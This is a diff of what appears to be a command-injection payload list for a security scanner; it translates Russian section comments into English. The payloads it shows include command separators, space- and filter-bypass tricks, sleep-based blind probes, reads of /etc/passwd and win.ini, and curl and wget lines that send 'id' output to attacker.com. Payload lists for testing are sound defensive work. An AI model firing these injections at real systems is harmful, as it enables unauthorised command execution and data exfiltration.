@@ -14,7 +14,7 @@ signatures:
   - "bash: "
   - "Permission denied"
 payloads:
-  # --- Основные разделители (Linux) ---
+  # --- Basic delimiters (Linux) ---
   - ";id"
   - " ;id"
   - "| id"
@@ -27,7 +27,7 @@ payloads:
   - "%0aid"
   - "%0a id"
 
-  # --- С пробелами ---
+  # --- With spaces ---
   - "; id"
   - " && id"
   - " || id"
@@ -45,7 +45,7 @@ payloads:
   - "\r\nwhoami"
   - "%0d%0awhoami"
 
-  # --- Обход пробелов (Linux) ---
+  # --- Space bypass (Linux) ---
   - ";{id}"
   - ";${IFS}id"
   - ";id%09"
@@ -60,7 +60,7 @@ payloads:
   - ";curl http://attacker.com/$(id)"
   - ";wget http://attacker.com/?x=`id`"
 
-  # --- time-based blind (если нет вывода) ---
+  # --- Time-based blind (if no output) ---
   - "; sleep 5"
   - "| sleep 5"
   - "& sleep 5"
@@ -70,7 +70,7 @@ payloads:
   - "$(sleep 5)"
   - "; ping -c 5 127.0.0.1"
 
-  # --- Полезные команды для проверки ---
+  # --- Useful commands for verification ---
   - "; cat /etc/passwd"
   - "| cat /etc/passwd"
   - "; whoami; id; hostname"
@@ -79,7 +79,7 @@ payloads:
   - "& type C:\\Windows\\win.ini"
   - "| type C:\\Windows\\win.ini"
 
-  # --- Обход фильтров ---
+  # --- Filter bypass ---
   - ";i`echo d`"
   - ";\"i\"\"d\""
   - ";$'id'"
